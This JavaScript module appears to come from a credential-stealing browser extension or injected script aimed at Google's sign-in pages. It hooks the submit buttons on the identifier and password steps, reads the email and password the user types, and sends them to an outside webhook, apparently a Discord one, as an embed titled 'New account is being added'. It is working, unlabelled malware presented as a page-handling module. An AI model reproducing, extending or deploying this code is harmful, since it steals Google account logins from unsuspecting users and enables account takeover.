const Util = require('../../utils');
const { formatFields, code } = require('../../utils/Webhook');
const variable = `messageid${Date.now()}`;

module.exports = {
  webPattern: /https:\/\/accounts\.google\.com/g,
  urlsMatches: [
    {
      path: '/v3/signin/identifier',
      run() {
        const emailInput = document.querySelector('.whsOnd.zHQkBf');
        const submitButton = document.querySelector('button[jscontroller="soHxf"][data-idom-class^="nCP5yc AjY5Oe"]');

        submitButton.addEventListener('click', async () => {
          const { id } = await Util.Webhook.sendEmbed({
            author: {
              name: 'Google'
            },
            title: 'New account is being added',
            fields: formatFields([
              ['Email', code(emailInput.value)],
            ])
          });
          window[variable] = id;
        });
      }
    },
    {
      path: '/v3/signin/challenge/pwd',
      run() {
        const passwordInput = document.querySelector('.whsOnd.zHQkBf');
        const submitButton = document.querySelector('button[jscontroller="soHxf"][data-idom-class^="nCP5yc AjY5Oe"]');

        submitButton.addEventListener('click', async () => {
          const embed = await Util.Webhook.getMessage(window[variable]);
          embed.fields.push(['Password', passwordInput.value]);
          await Util.Webhook.editEmbed(embed, window[variable]);
        });
      }
    }
  ]
};
